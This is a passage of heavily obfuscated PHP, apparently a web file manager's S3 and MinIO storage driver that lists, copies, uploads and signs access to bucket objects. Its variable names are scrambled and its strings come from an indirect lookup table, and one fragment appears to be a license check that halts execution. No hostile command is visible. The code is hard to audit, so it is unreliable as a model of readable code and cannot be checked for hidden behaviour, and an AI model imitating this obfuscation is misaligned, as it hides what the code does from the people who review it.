$ç°ø£Å¦[209], $ç°ø£Å¦[210], $ç°ø£Å¦[211]); $¢ß·ØèÙ = array_diff($Ö¦ñ¼, $ƒÄï”‹¤); return empty($¢ß·ØèÙ); } public function mkfile($ğëãªÔµ, $é­Éò¢’ = '', $—å°˜Î = REPEAT_RENAME) { $°µ£Î’Æ = $this->setContent($ğëãªÔµ, $é­Éò¢’); if ($°µ£Î’Æ !== !1) { return $this->getPathOuter($ğëãªÔµ); } return !1; } public function mkdir($ıñ©Ã¡œ, $¾Ñ—Ñ»â = REPEAT_SKIP) { $¥Ğ¨š¤ =& $_SERVER[³½¬ÚË¯]; if (empty($ıñ©Ã¡œ) && $ıñ©Ã¡œ !== $¥Ğ¨š¤[212]) { return !1; } if ($¾Ñ—Ñ»â && $this->_isFolder($ıñ©Ã¡œ)) { return $this->getPathOuter($ıñ©Ã¡œ); } $É¬¾èõ = $this->setContent($ıñ©Ã¡œ, $¥Ğ¨š¤[12], !0); if ($É¬¾èõ !== !1) { return $this->getPathOuter($ıñ©Ã¡œ); } return !1; } public function copyFile($ŞÙŠ‚é, $‹Õé îÊ, $°›‚ìíÇ = array()) { $£Á€…¦ =& $_SERVER[³½¬ÚË¯]; $Ñ‡öî¯ï = $this->objectMeta($ŞÙŠ‚é); if (!$Ñ‡öî¯ï) { return !1; } if ($Ñ‡öî¯ï[$£Á€…¦[76]] <= 1024 * 1024 * 200) { $‘àİ‘ü§ = $this->client->copyObject($this->bucket, $ŞÙŠ‚é, $this->bucket, $‹Õé îÊ, $£Á€…¦[213], $°›‚ìíÇ); } else { $‘àİ‘ü§ = $this->client->multiCopyObject($this->bucket, $ŞÙŠ‚é, $this->bucket, $‹Õé îÊ, $°›‚ìíÇ); } $‘àİ‘ü§ = $‘àİ‘ü§ ? $this->getPathOuter($‹Õé îÊ) : !1; return $‘àİ‘ü§; } public function moveFile($„Î¸˜Ü×, $Î–¯œìŸ) { if ($this->copyFile($„Î¸˜Ü×, $Î–¯œìŸ)) { $this->delFile($„Î¸˜Ü×); return $this->getPathOuter($Î–¯œìŸ); } return !1; } public function delFile($Áœ¾»†) { return $this->client->deleteObject($this->bucket, $Áœ¾»†); } public function delFolder($Íáõßõ) { $„Ø“Õ³Ù =& $_SERVER[³½¬ÚË¯]; if (!$this->exist($Íáõßõ)) { return !0; } $this->listItemCache = !1; $¤™Å…Öè = $this->fileList($Íáõßõ); $this->listItemCache = !0; $¼òŠ»¼± = trim($Íáõßõ, $„Ø“Õ³Ù[8]) . $„Ø“Õ³Ù[8]; if (!empty($Íáõßõ) && $Íáõßõ !== $„Ø“Õ³Ù[212] && !in_array($¼òŠ»¼±, $¤™Å…Öè[$„Ø“Õ³Ù[82]])) { $¤™Å…Öè[$„Ø“Õ³Ù[82]][] = $¼òŠ»¼±; } $ÂÃôÂÄ† = $this->delByBatch($¤™Å…Öè[$„Ø“Õ³Ù[83]]); if (!$ÂÃôÂÄ†) { return !1; } $ÂÃôÂÄ† = $this->delByBatch($¤™Å…Öè[$„Ø“Õ³Ù[82]]); if (!$ÂÃôÂÄ†) { return !1; } return $this->delFile($¼òŠ»¼±); } private function delByBatch($«ä¸ºà×) { foreach (array_chunk($«ä¸ºà×, 1000) as $ºïù¾ç) { $Ñã¨Ç¸ = $this->client->deleteObjects($this->bucket, $ºïù¾ç); if (!$Ñã¨Ç¸) { return !1; } } return !0; } public function rename($Ññ¸Ô¢ß, $»ÜÈ €) { return $this->renameObject($Ññ¸Ô¢ß, $»ÜÈ €); } public function listPath($‰û½¿¡Í, $’œòÁ­ä = false) { $ı„¸ª¯œ =& $_SERVER[³½¬ÚË¯]; $¾ÏË“Š‰ = $this->fileList($‰û½¿¡Í, $ı„¸ª¯œ[8], !0); foreach ($¾ÏË“Š‰[$ı„¸ª¯œ[82]] as $Í”ŒÛğæ => $Åƒ«éÇ¥) { $¾ÏË“Š‰[$ı„¸ª¯œ[82]][$Í”ŒÛğæ] = $this->folderInfo($Åƒ«éÇ¥, $’œòÁ­ä, $Åƒ«éÇ¥); } foreach ($¾ÏË“Š‰[$ı„¸ª¯œ[83]] as $Í”ŒÛğæ => $Åƒ«éÇ¥) { $¾ÏË“Š‰[$ı„¸ª¯œ[83]][$Í”ŒÛğæ] = $this->fileInfo($Åƒ«éÇ¥[$ı„¸ª¯œ[32]], $’œòÁ­ä, $Åƒ«éÇ¥); } return $¾ÏË“Š‰; } protected function infoChildren($‚Åİ¼İ›, &$•÷Ãúæî) { $¢Şì»Óä =& $_SERVER[³½¬ÚË¯]; $Õ“©·û = $this->fileList($‚Åİ¼İ›, $¢Şì»Óä[12], !0); $•÷Ãúæî[$¢Şì»Óä[78]] += count($Õ“©·û[$¢Şì»Óä[82]]); $•÷Ãúæî[$¢Şì»Óä[77]] += count($Õ“©·û[$¢Şì»Óä[83]]); foreach ($Õ“©·û[$¢Şì»Óä[83]] as $Í¤°öÄ) { if (!$Í¤°öÄ || !$Í¤°öÄ[$¢Şì»Óä[76]]) { continue; } $•÷Ãúæî[$¢Şì»Óä[76]] += $Í¤°öÄ[$¢Şì»Óä[76]]; } } private function fileInfo($®‹óÜÓ…, $óÁÑåä¸ = false, $ÓîĞÛ‡ = array()) { $ì¨çÊç =& $_SERVER[³½¬ÚË¯]; $•®›¯Ñµ = array($ì¨çÊç[32] => $this->pathThis($®‹óÜÓ…), $ì¨çÊç[84] => $this->getPathOuter($®‹óÜÓ…), $ì¨çÊç[33] => $ì¨çÊç[214], $ì¨çÊç[175] => $this->ext($®‹óÜÓ…), $ì¨çÊç[76] => isset($ÓîĞÛ‡[$ì¨çÊç[76]]) ? $ÓîĞÛ‡[$ì¨çÊç[76]] : 0); if ($óÁÑåä¸) { return $•®›¯Ñµ; } $•®›¯Ñµ[$ì¨çÊç[215]] = $•®›¯Ñµ[$ì¨çÊç[85]] = 0; $•®›¯Ñµ[$ì¨çÊç[216]] = $•®›¯Ñµ[$ì¨çÊç[217]] = !0; if (empty($ÓîĞÛ‡)) { $ÓîĞÛ‡ = $this->objectMeta($®‹óÜÓ…); if (!$ÓîĞÛ‡) { return $•®›¯Ñµ; } } if (isset($ÓîĞÛ‡[$ì¨çÊç[218]]) && $ÓîĞÛ‡[$ì¨çÊç[218]]) { $•®›¯Ñµ[$ì¨çÊç[219]] = $ÓîĞÛ‡[$ì¨çÊç[218]]; } if (isset($ÓîĞÛ‡[$ì¨çÊç[194]])) { $•®›¯Ñµ[$ì¨çÊç[85]] = $ÓîĞÛ‡[$ì¨çÊç[194]]; } if (isset($ÓîĞÛ‡[$ì¨çÊç[76]])) { $•®›¯Ñµ[$ì¨çÊç[76]] = $ÓîĞÛ‡[$ì¨çÊç[76]]; } return $•®›¯Ñµ; } private function folderInfo($—üÂ¶°, $®¶Å¤¦ = false, $×±«ä = array()) { $ÃªüÀ¹ˆ =& $_SERVER[³½¬ÚË¯]; $¡Ó»¥ë = array($ÃªüÀ¹ˆ[32] => $this->pathThis($—üÂ¶°), $ÃªüÀ¹ˆ[84] => $this->getPathOuter($ÃªüÀ¹ˆ[8] . $—üÂ¶°), $ÃªüÀ¹ˆ[33] => $ÃªüÀ¹ˆ[75]); if ($®¶Å¤¦) { return $¡Ó»¥ë; } $¡Ó»¥ë[$ÃªüÀ¹ˆ[215]] = $¡Ó»¥ë[$ÃªüÀ¹ˆ[85]] = 0; $¡Ó»¥ë[$ÃªüÀ¹ˆ[216]] = $¡Ó»¥ë[$ÃªüÀ¹ˆ[217]] = !0; if ($—üÂ¶° == $ÃªüÀ¹ˆ[12]) { return $¡Ó»¥ë; } if (empty($×±«ä)) { $×±«ä = $this->objectMeta(trim($—üÂ¶°, $ÃªüÀ¹ˆ[8]) . $ÃªüÀ¹ˆ[8]); } if (isset($×±«ä[$ÃªüÀ¹ˆ[194]])) { $¡Ó»¥ë[$ÃªüÀ¹ˆ[215]] = $×±«ä[$ÃªüÀ¹ˆ[194]]; } return $¡Ó»¥ë; } private function fileList($ç‘³Å·¸, $‰ïËÚ¾ = '', $Ú¶©…Ã = 0) { $Õ“é·‰á =& $_SERVER[³½¬ÚË¯]; $åÉÜ´± = rtrim($ç‘³Å·¸, $Õ“é·‰á[8]) . $Õ“é·‰á[8]; $ù·Îêõ = $this->listObjs($åÉÜ´±, null, null, $‰ïËÚ¾); if (!$ù·Îêõ) { return array($Õ“é·‰á[82] => array(), $Õ“é·‰á[83] => array()); } $„õ©¸ƒÁ = $ĞâğøˆÖ = array(); foreach ($ù·Îêõ[$Õ“é·‰á[220]] as $´¤İí˜ô) { $©òµ ô¾ = $´¤İí˜ô[$Õ“é·‰á[32]]; if ($©òµ ô¾ == $åÉÜ´±) { continue; } $ŒıÍ®ä = isset($´¤İí˜ô[$Õ“é·‰á[76]]) ? $´¤İí˜ô[$Õ“é·‰á[76]] : 0; $İ„‡–òİ = $ŒıÍ®ä == 0 && substr($©òµ ô¾, strlen($©òµ ô¾) - 1, 1) == $Õ“é·‰á[8] ? !0 : !1; $this->cacheMethodInfoSet($©òµ ô¾, $İ„‡–òİ, $´¤İí˜ô); if ($İ„‡–òİ) { $„õ©¸ƒÁ[] = $©òµ ô¾; continue; } $ĞâğøˆÖ[] = $Ú¶©…Ã ? $´¤İí˜ô : $©òµ ô¾; } foreach ($ù·Îêõ[$Õ“é·‰á[221]] as $´¤İí˜ô) { $„õ©¸ƒÁ[] = $´¤İí˜ô[$Õ“é·‰á[32]]; $this->cacheMethodInfoSet($´¤İí˜ô[$Õ“é·‰á[32]], !0); } $this->cacheMethodInfoSet($ç‘³Å·¸, !0); return array($Õ“é·‰á[82] => $„õ©¸ƒÁ, $Õ“é·‰á[83] => $ĞâğøˆÖ); } private function listObjs($ÏÖìæ«‹, $Îö™ˆ¶ = null, $«Îç ˜ò = null, $Ûğç’ºÃ = null) { $ã‚ô„ÚÊ =& $_SERVER[³½¬ÚË¯]; $ÏÖìæ«‹ = trim($ÏÖìæ«‹, $ã‚ô„ÚÊ[8]); $õ¸¹Ú·— = empty($ÏÖìæ«‹) && $ÏÖìæ«‹ !== $ã‚ô„ÚÊ[212] ? $ã‚ô„ÚÊ[12] : $ÏÖìæ«‹ . $ã‚ô„ÚÊ[8]; return $this->client->getBucket($this->bucket, $õ¸¹Ú·—, $Îö™ˆ¶, $«Îç ˜ò, $Ûğç’ºÃ, !0); } public function has($ìÌˆÆ˜“, $Èçâó = false, $â«Ü°‘ = true) { $¾¤©«ø× =& $_SERVER[³½¬ÚË¯]; $ìÌˆÆ˜“ = trim($ìÌˆÆ˜“, $¾¤©«ø×[8]); $ªß±®§Œ = empty($ìÌˆÆ˜“) && $ìÌˆÆ˜“ !== $¾¤©«ø×[212] ? $¾¤©«ø×[12] : $ìÌˆÆ˜“ . $¾¤©«ø×[8]; $ØµõéÛ = null; $ß›İ×„˜ = 500; $¨ü±ÂÄı = $¾¤©«ø×[8]; $Œ½˜‚Ò = $ÌÎ×øÑ¤ = array(); while (!0) { $¾ÒÇ¸– = $this->listObjs($ìÌˆÆ˜“, $ØµõéÛ, $ß›İ×„˜, $¨ü±ÂÄı); if (!$¾ÒÇ¸–) { break; } $ØµõéÛ = $¾ÒÇ¸–[$¾¤©«ø×[222]]; $ƒ‚ãã³ = $¾ÒÇ¸–[$¾¤©«ø×[220]]; $©¡ß’­ = $¾ÒÇ¸–[$¾¤©«ø×[221]]; if (empty($ƒ‚ãã³) && empty($©¡ß’­)) { break; } if (count($ƒ‚ãã³) == 1 && $ƒ‚ãã³[0][$¾¤©«ø×[32]] == $ªß±®§Œ) { break; } if ($Èçâó) { if (count($ƒ‚ãã³)) { $ƒ‚ãã³ = array_column($ƒ‚ãã³, $¾¤©«ø×[32]); $Œ½˜‚Ò = array_merge($Œ½˜‚Ò, $ƒ‚ãã³); } if (count($©¡ß’­)) { $©¡ß’­ = array_column($©¡ß’­, $¾¤©«ø×[32]); $ÌÎ×øÑ¤ = array_merge($ÌÎ×øÑ¤, $©¡ß’­); } if ($ØµõéÛ === null) { break; } continue; } if ($â«Ü°‘) { if (!empty($ƒ‚ãã³)) { if (count($ƒ‚ãã³) > 1 || isset($ƒ‚ãã³[0][$¾¤©«ø×[32]]) && $ƒ‚ãã³[0][$¾¤©«ø×[32]] != $ªß±®§Œ) { return !0; } } } else { if (!empty($©¡ß’­)) { return !0; } } if ($ØµõéÛ === null) { break; } } if ($Èçâó) { $Œ½˜‚Ò = array_diff($Œ½˜‚Ò, array($ªß±®§Œ)); $Œ½˜‚Ò = count(array_unique($Œ½˜‚Ò)); $ÌÎ×øÑ¤ = count(array_unique($ÌÎ×øÑ¤)); return array($¾¤©«ø×[223] => $Œ½˜‚Ò, $¾¤©«ø×[224] => $ÌÎ×øÑ¤); } return !1; } public function listAll($üÃšË°Í) { $½¹Ü„Ù =& $_SERVER[³½¬ÚË¯]; $ê¹’Âİ = $this->fileList($üÃšË°Í, $½¹Ü„Ù[12], !0); $–óÍƒ¢£ = array_to_keyvalue($ê¹’Âİ[$½¹Ü„Ù[83]], $½¹Ü„Ù[32]); foreach ($ê¹’Âİ[$½¹Ü„Ù[82]] as $¾ç·ıÀï) { if (is_string($¾ç·ıÀï)) { $–óÍƒ¢£[$¾ç·ıÀï] = array($½¹Ü„Ù[76] => 0); } } return $this->listAllFiles($üÃšË°Í, $–óÍƒ¢£); } public function canRead($ëÌÕÊ‡¬) { $—ñ¢”Îƒ =& $_SERVER[³½¬ÚË¯]; $ğø’ê¼Ü = $this->client->getAccessControlPolicy($this->bucket, $ëÌÕÊ‡¬); if (!$ğø’ê¼Ü) { return !1; } return in_array($ğø’ê¼Ü, array($—ñ¢”Îƒ[225], $—ñ¢”Îƒ[226], $—ñ¢”Îƒ[227])) ? !0 : !1; } public function canWrite($­°ğ¯š) { $Š†Á¾˜ë =& $_SERVER[³½¬ÚË¯]; $ñ¦Ë¡ƒò = $this->client->getAccessControlPolicy($this->bucket, $­°ğ¯š); if (!$ñ¦Ë¡ƒò) { return !1; } return in_array($ñ¦Ë¡ƒò, array($Š†Á¾˜ë[225], $Š†Á¾˜ë[226])) ? !0 : !1; } public function getContent($»¢ˆ£†±) { return $this->client->getObject($this->bucket, $»¢ˆ£†±); } public function setContent($Í…’ç÷³, $÷Áçãáá = '', $´ù¹¢çş = false) { $—å ü­à =& $_SERVER[³½¬ÚË¯]; $Í…’ç÷³ = $´ù¹¢çş ? trim($Í…’ç÷³, $—å ü­à[8]) . $—å ü­à[8] : $Í…’ç÷³; $Â€†¡ë = get_file_mime(get_path_ext($Í…’ç÷³)); $û™Ñ²² = $this->client->putObject($÷Áçãáá, $this->bucket, $Í…’ç÷³, $—å ü­à[213], array(), $Â€†¡ë); if (!$û™Ñ²²) { return !1; } if ($´ù¹¢çş) { return !0; } $this->cacheMethod(null, null); $û™Ñ²² = $this->copyFile($Í…’ç÷³, $Í…’ç÷³, array($—å ü­à[228] => $û™Ñ²²[$—å ü­à[218]])); return $û™Ñ²² ? !0 : !1; } public function fileSubstr($Ùø‹íÇà, $ş«ƒ–—, $úŸ›±ÑŠ) { $ê­„» Ä = $ş«ƒ–— + $úŸ›±ÑŠ - 1; return $this->client->getObject($this->bucket, $Ùø‹íÇà, array($_SERVER[³½¬ÚË¯][229] => "\142\171\164\x65\x73\75{$ş«ƒ–—}\x2d{$ê­„» Ä}")); } public function upload($­ÛŒÎ¤ñ, $±ŸªÙÆÄ, $â¢Ë÷ı = false, $ó§î¶ = REPEAT_REPLACE) { $÷ÖÃ¬Ã‘ =& $_SERVER[³½¬ÚË¯]; $«ÔıœÒ = array($÷ÖÃ¬Ã‘[228] => @md5_file($±ŸªÙÆÄ)); $¥±š Å = array($÷ÖÃ¬Ã‘[230] => get_file_mime(get_path_ext($­ÛŒÎ¤ñ))); if (IO::size($±ŸªÙÆÄ) <= 1024 * 1024 * 200) { $Ì˜ª­¾æ = $this->client->putObjectFile($±ŸªÙÆÄ, $this->bucket, $­ÛŒÎ¤ñ, $÷ÖÃ¬Ã‘[213], $«ÔıœÒ, $¥±š Å); return !empty($Ì˜ª­¾æ) ? $this->getPathOuter($­ÛŒÎ¤ñ) : !1; } $Î³ÈµÃĞ = $this->client->multiUploadObject($±ŸªÙÆÄ, $this->bucket, trim($­ÛŒÎ¤ñ, $÷ÖÃ¬Ã‘[8]), $«ÔıœÒ, $¥±š Å); return $Î³ÈµÃĞ ? $this->getPathOuter($­ÛŒÎ¤ñ) : !1; } public function download($‘ÃØ½×Ş, $ç‘®®ó) { if (!@is_dir($this->pathFather($ç‘®®ó)) && !IO::mkdir($this->pathFather($ç‘®®ó))) { return !1; } $¹‚âşÁ— = $this->client->getObject($this->bucket, $‘ÃØ½×Ş, array(), $ç‘®®ó); return $¹‚âşÁ— !== !1 ? $ç‘®®ó : !1; } public function link($öá¯Š­, $™ÌÂ¡«¢ = array()) { $í¶çĞ–… =& $_SERVER[³½¬ÚË¯]; if ($this->signVer == $í¶çĞ–…[231]) { return $this->client->getAuthenticatedURL($this->bucket, $öá¯Š­, 3600 * 12, $™ÌÂ¡«¢); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($öá¯Š­, $í¶çĞ–…[8]), 3600 * 12, $this->region, array(), !0, $™ÌÂ¡«¢); } public function fileOut($Ğ™ö´øİ, $ı¢‹Åİå = false, $óó¿–ôê = false, $Ä½÷–£À = '') { $•¾µûğ• =& $_SERVER[³½¬ÚË¯]; if ($this->isFileOutServer()) { return $this->fileOutServer($Ğ™ö´øİ, $ı¢‹Åİå, $óó¿–ôê, $Ä½÷–£À); } if (!$óó¿–ôê) { $óó¿–ôê = $this->pathThis($Ğ™ö´øİ); } $Èî·ô¢ã = get_file_mime(get_path_ext($óó¿–ôê)); if ($Èî·ô¢ã == $•¾µûğ•[232]) { return parent::fileOut($Ğ™ö´øİ, $ı¢‹Åİå, $óó¿–ôê, $Ä½÷–£À); } $–íÁˆ¥ = array($•¾µûğ•[233] => $Èî·ô¢ã); if ($ı¢‹Åİå) { $–íÁˆ¥[$•¾µûğ•[234]] = $•¾µûğ•[235] . rawurlencode($óó¿–ôê); } else { } $±ìêåşÏ = $this->link($Ğ™ö´øİ, $–íÁˆ¥); $this->fileOutLink($±ìêåşÏ); } public function fileOutServer($Èàø¾Ÿ¥, $ó¬ÅÄëÈ = false, $ª•åœ±ú = false, $ó”¢¹¤è = '') { parent::fileOut($Èàø¾Ÿ¥, $ó¬ÅÄëÈ, $ª•åœ±ú, $ó”¢¹¤è); } public function fileOutImageServer($‹¤èŠÜĞ, $‚¨¶à„² = 250) { parent::fileOutImage($‹¤èŠÜĞ, $‚¨¶à„²); } public function hashMd5($¦ÒúªÉ, $Ä¢ÁŠš = '') { $ò§×£û =& $_SERVER[³½¬ÚË¯]; $Ï¿Ü›‡ = $this->objectMeta($¦ÒúªÉ); if (!$Ï¿Ü›‡) { return !1; } $Ä¢ÁŠš = $Ä¢ÁŠš ? $Ä¢ÁŠš : _get($Ï¿Ü›‡, $ò§×£û[236]); $Ä¢ÁŠš = $Ä¢ÁŠš ? $Ä¢ÁŠš : _get($Ï¿Ü›‡, $ò§×£û[218], $ò§×£û[12]); return $Ä¢ÁŠš; } public function uploadFormData($—›á‰¯, $¯¡ÄîÇ = 3600) { $¾Ñ¦™ª =& $_SERVER[³½¬ÚË¯]; $ÁÇÚ¨”Ò = $this->pathFather($—›á‰¯); $ô›…¶¿» = $this->client->getHttpUploadPostParams($this->bucket, $ÁÇÚ¨”Ò, $¾Ñ¦™ª[213], $¯¡ÄîÇ); return array_merge((array) $ô›…¶¿», array($¾Ñ¦™ª[196] => $this->getHost())); } public function multiUploadFormData($Â³ä¡È, $³ÏßÚø = 3600) { $Ó¶œÅ¯ =& $_SERVER[³½¬ÚË¯]; $¾Ù›İé• = gmdate($Ó¶œÅ¯[237]); $µÍëœÔ¯ = array(); $‚“‹í† = $this->client->getUploadId($this->bucket, $Â³ä¡È, $µÍëœÔ¯); if (!$‚“‹í†) { return !1; } return array($Ó¶œÅ¯[238] => $‚“‹í†, $Ó¶œÅ¯[196] => $this->getHost() . $Ó¶œÅ¯[8] . $this->pathEncode($Â³ä¡È), $Ó¶œÅ¯[239] => $¾Ù›İé•, $Ó¶œÅ¯[94] => $Â³ä¡È); } public function multiUploadAuthData($Øï¼´¥¿, $ıùúµ“¬ = array()) { $»–ƒÛŞÕ =& $_SERVER[³½¬ÚË¯]; $ÉëÄ¯…† = isset($ıùúµ“¬[$»–ƒÛŞÕ[239]]) ? $ıùúµ“¬[$»–ƒÛŞÕ[239]] : gmdate($»–ƒÛŞÕ[237]); $Í£î¬·Ë = isset($ıùúµ“¬[$»–ƒÛŞÕ[175]]) ? $ıùúµ“¬[$»–ƒÛŞÕ[175]] : $»–ƒÛŞÕ[12]; $öĞºòûö = $ıùúµ“¬[$»–ƒÛŞÕ[94]]; unset($ıùúµ“¬[$»–ƒÛŞÕ[94]]); if (isset($ıùúµ“¬[$»–ƒÛŞÕ[240]])) { $ıùúµ“¬[$»–ƒÛŞÕ[239]] = $ÉëÄ¯…†; return $this->listUploadParts($öĞºòûö, $ıùúµ“¬); } $Ôí¶¬ı  = array($»–ƒÛŞÕ[241], $»–ƒÛŞÕ[12], $»–ƒÛŞÕ[120], $»–ƒÛŞÕ[12], "\170\x2d\141\155\x7a\x2d\x64\141\164\x65\x3a{$ÉëÄ¯…†}", $»–ƒÛŞÕ[8] . $this->bucket . $»–ƒÛŞÕ[8] . $this->pathEncode($öĞºòûö) . $Í£î¬·Ë); if (strpos($Í£î¬·Ë, $»–ƒÛŞÕ[242]) === 0) { $Ôí¶¬ı [0] = $»–ƒÛŞÕ[243]; } if (isset($ıùúµ“¬[$»–ƒÛŞÕ[244]]) && $ıùúµ“¬[$»–ƒÛŞÕ[244]] == $»–ƒÛŞÕ[245]) { $Ôí¶¬ı [0] = $»–ƒÛŞÕ[245]; } $‰Ø¼’åÏ = implode($»–ƒÛŞÕ[246], $Ôí¶¬ı ); $ìŠ·ı’Ù = base64_encode(hash_hmac($»–ƒÛŞÕ[247], $‰Ø¼’åÏ, $this->secret, !0)); $¯‹æĞ¤« = $»–ƒÛŞÕ[248] . $this->accessKey . $»–ƒÛŞÕ[4] . $ìŠ·ı’Ù; if (strpos($Í£î¬·Ë, $»–ƒÛŞÕ[242]) === 0) { return array($»–ƒÛŞÕ[249] => $¯‹æĞ¤«, $»–ƒÛŞÕ[239] => $ÉëÄ¯…†); } return $¯‹æĞ¤«; } public function listUploadParts($äÄ¿—šÎ, $Ï³¦¼¡ = array()) { $åºœíÇğ =& $_SERVER[³½¬ÚË¯]; $ÏâÛ‹èì = str_replace($åºœíÇğ[250], $åºœíÇğ[12], $Ï³¦¼¡[$åºœíÇğ[175]]); $ËÚÊÏ‚Ì = $this->client->listParts($this->bucket, $äÄ¿—šÎ, $ÏâÛ‹èì); if (!$ËÚÊÏ‚Ì) { return !1; } unset($Ï³¦¼¡[$åºœíÇğ[240]], $Ï³¦¼¡[$åºœíÇğ[244]]); $Ï³¦¼¡[$åºœíÇğ[94]] = $äÄ¿—šÎ; $ëóœ­’ = $this->multiUploadAuthData($äÄ¿—šÎ, $Ï³¦¼¡); if (empty($ëóœ­’)) { return !1; } return array($åºœíÇğ[249] => $ëóœ­’, $åºœíÇğ[239] => $Ï³¦¼¡[$åºœíÇğ[239]], $åºœíÇğ[251] => $ËÚÊÏ‚Ì); } public function getHost() { return parent::getHost() . $_SERVER[³½¬ÚË¯][8] . $this->bucket; } public function size($ğ‚Æó²) { $€ÍŒá¾µ = $this->objectMeta($ğ‚Æó²); return $€ÍŒá¾µ ? $€ÍŒá¾µ[$_SERVER[³½¬ÚË¯][76]] : 0; } public function info($üåÀŸÚØ) { if ($this->isFolder($üåÀŸÚØ)) { return $this->folderInfo($üåÀŸÚØ); } else { if ($this->isFile($üåÀŸÚØ)) { return $this->fileInfo($üåÀŸÚØ); } } return !1; } public function exist($æÛ¿‹ÂÍ) { return $this->isFile($æÛ¿‹ÂÍ) || $this->isFolder($æÛ¿‹ÂÍ); } public function isFile($ó¯´û— ) { return !$this->isFolder($ó¯´û— ) && $this->objectMeta($ó¯´û— ); } public function isFolder($¼İ½ùã) { return $this->cacheMethod($_SERVER[³½¬ÚË¯][166], $¼İ½ùã); } protected function objectMeta($ĞÀˆ×„) { return $this->cacheMethod($_SERVER[³½¬ÚË¯][168], $ĞÀˆ×„); } protected function _objectMeta($ ¬ä¾›í) { $œø×ÑÍ =& $_SERVER[³½¬ÚË¯]; $ ¬ä¾›í = rtrim($ ¬ä¾›í, $œø×ÑÍ[8]); try { $†™İ…€« = $this->client->getObjectInfo($this->bucket, $ ¬ä¾›í); if (!isset($†™İ…€«[$œø×ÑÍ[236]]) && isset($†™İ…€«[$œø×ÑÍ[252]])) { $†™İ…€«[$œø×ÑÍ[236]] = $†™İ…€«[$œø×ÑÍ[252]]; } } catch (Exception $è­ä…­ù) { $†™İ…€« = !1; } if (!$†™İ…€«) { } return $†™İ…€«; } protected function _isFolder($¹ªìß½Ò) { $¡¨²ıœ =& $_SERVER[³½¬ÚË¯]; $¹ªìß½Ò = rtrim($¹ªìß½Ò, $¡¨²ıœ[8]); if ($¹ªìß½Ò == $¡¨²ıœ[12] || $¹ªìß½Ò == $¡¨²ıœ[8]) { return !0; } $ÀşŠñã« = $this->client->getBucket($this->bucket, $¹ªìß½Ò, null, 1); if (empty($ÀşŠñã«[$¡¨²ıœ[220]])) { return !1; } $ı¼µ½Ğ– = $ÀşŠñã«[$¡¨²ıœ[220]][0][$¡¨²ıœ[32]]; return stripos($ı¼µ½Ğ–, $¹ªìß½Ò . $¡¨²ıœ[8]) === 0 ? !0 : !1; if (substr($ı¼µ½Ğ–, -1) == $¡¨²ıœ[8]) { return !0; } if (get_path_this($ı¼µ½Ğ–) == get_path_this($¹ªìß½Ò)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($ğøË¯ğ) { parent::__construct($ğøË¯ğ); $this->signatureVersion($_SERVER[³½¬ÚË¯][231]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function uploadFormData($Øõ˜Ö„ç, $Ù¤Ü•­¤ = 3600) { $Ù£¡®Š =& $_SERVER[³½¬ÚË¯]; $‚ç‚Õ·´ = $Ù£¡®Š[213]; $–‘ñ¥®¨ = $Ù£¡®Š[253]; $² ¯“¢¤ = $Ù£¡®Š[62]; $†Ò»úÒå = gmdate($Ù£¡®Š[254]); $‰ğ‹è± = gmdate($Ù£¡®Š[255]); $ôŸşœÉö = $Ù£¡®Š[256]; $ı–¼ó¯ö = $Ù¤Ü•­¤ . $Ù£¡®Š[12]; $ªÈÁå ğ = $Ù£¡®Š[257]; $ºÀúÆ¯¿ = array($this->accessKey, $‰ğ‹è±, $this->region, $² ¯“¢¤, $ôŸşœÉö); $¨Ò”úÅê = implode($Ù£¡®Š[8], $ºÀúÆ¯¿); $ËÂËšöå = array($Ù£¡®Š[258] => gmdate($Ù£¡®Š[259], strtotime($Ù£¡®Š[260])), $Ù£¡®Š[261] => array(array($Ù£¡®Š[262] => $this->bucket), array($Ù£¡®Š[263] => $‚ç‚Õ·´), array($Ù£¡®Š[264], $Ù£¡®Š[265], $Ù£¡®Š[12]), array($Ù£¡®Š[264], $Ù£¡®Š[266], $Ù£¡®Š[12]), array($Ù£¡®Š[264], $Ù£¡®Š[267], $Ù£¡®Š[12]), array($Ù£¡®Š[268] => $ªÈÁå ğ), array($Ù£¡®Š[269] => $¨Ò”úÅê), array($Ù£¡®Š[270] => $–‘ñ¥®¨), array($Ù£¡®Š[271] => $†Ò»úÒå), array($Ù£¡®Š[272] => $ı–¼ó¯ö))); $Ôõ¢èíÀ = base64_encode(json_encode($ËÂËšöå)); $„›°ÀŠ€ = hash_hmac($Ù£¡®Š[273], $‰ğ‹è±, $Ù£¡®Š[274] . $this->secret, !0); $¼ •ö‹‡ = hash_hmac($Ù£¡®Š[273], $this->region, $„›°ÀŠ€, !0); $Í‡—¡±ã = hash_hmac($Ù£¡®Š[273], $² ¯“¢¤, $¼ •ö‹‡, !0); $’Æ¾øË = hash_hmac($Ù£¡®Š[273], $ôŸşœÉö, $Í‡—¡±ã, !0); $‚¤Ÿõ‹Ë = hash_hmac($Ù£¡®Š[273], $Ôõ¢èíÀ, $’Æ¾øË); $áÕø¨‹™ = array($Ù£¡®Š[230] => $Ù£¡®Š[12], $Ù£¡®Š[275] => $Ù£¡®Š[12], $Ù£¡®Š[263] => $‚ç‚Õ·´, $Ù£¡®Š[268] => $ªÈÁå ğ, $Ù£¡®Š[276] => $Ôõ¢èíÀ, $Ù£¡®Š[277] => $¨Ò”úÅê, $Ù£¡®Š[278] => $–‘ñ¥®¨, $Ù£¡®Š[279] => $†Ò»úÒå, $Ù£¡®Š[280] => $ı–¼ó¯ö, $Ù£¡®Š[281] => $‚¤Ÿõ‹Ë, $Ù£¡®Š[196] => $this->getHost()); return $áÕø¨‹™; } } goto F‡îì×•áÜ; dÁ×âŞ²”: define($_SERVER[³½¬ÚË¯][646], $_SERVER[³½¬ÚË¯][647]); $ognajyreuc = $_SERVER[³½¬ÚË¯][648]; if (strlen($ognajyreuc) < $_SERVER[³½¬ÚË¯][649]) { die; } goto d¬½ÜÃÛˆ; fäİîÇÃ®: class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\155\x2e\163\157\165\x72\143\x65\123\x65\143\162\x65\164\x4c\151\163\164"; public $field = array("\x73\x6f\165\x72\143\x65\111\104", "\x74\171\x70\x65\x49\104", "\x63\162\x65\141\164\145\125\x73\145\x72"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\155\x2e\x73\x74\x6f\162\x61\147\x65\x4c\x69\x73\x74"; public $field = 